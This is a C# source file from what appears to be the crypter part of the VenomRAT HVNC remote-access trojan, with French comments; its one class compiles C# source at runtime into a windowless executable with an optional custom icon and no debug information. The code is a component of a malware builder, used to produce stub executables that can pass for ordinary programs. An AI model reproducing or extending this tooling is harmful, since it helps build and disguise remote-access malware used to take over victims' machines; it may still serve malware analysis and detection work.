using System.CodeDom.Compiler;
using System.Windows.Forms;

namespace VenomRAT_HVNC.Crypter.Other
{
    public class Compiler
    {
        public static void CompileCSharpFile(string inputFileCs, string outputPathExe, string icon = null)
        {
            // Créez une nouvelle instance de compilateur
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");


            // Définissez les paramètres pour le compilateur
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = outputPathExe;
            if (System.Environment.Is64BitProcess)
            {
                parameters.CompilerOptions = "/target:winexe /platform:x64 /optimize";
            }
            else
            {
                parameters.CompilerOptions = "/target:winexe /platform:x86 /optimize";
            }

            if (!string.IsNullOrEmpty(icon))
            {
                parameters.CompilerOptions += $" /win32icon:\"{icon}\"";
            }


            // Ajoutez toutes les références ou les imports supplémentaires requis
            parameters.ReferencedAssemblies.AddRange(new[]
            {
                "System.dll",
                "System.Core.dll",
                "mscorlib.dll",
                "System.IO.Compression.dll",
                "System.IO.Compression.FileSystem.dll", // Ajout de cette ligne
                "System.Reflection.dll",
                "System.Security.dll",
                "System.Runtime.InteropServices.dll"
            });
            parameters.TreatWarningsAsErrors = false;
            parameters.IncludeDebugInformation = false;

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, inputFileCs);


            // Vérifiez s'il y a des erreurs
            if (results.Errors.Count > 0)
            {
                string errorMessage = "Erreur lors de la compilation de l'assembly :\n\n";
                foreach (CompilerError error in results.Errors)
                {
                    errorMessage += $"{error.ErrorText} (Ligne {error.Line}, Colonne {error.Column})\n";
                }

                MessageBox.Show(errorMessage, @"Erreur de Compilation", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}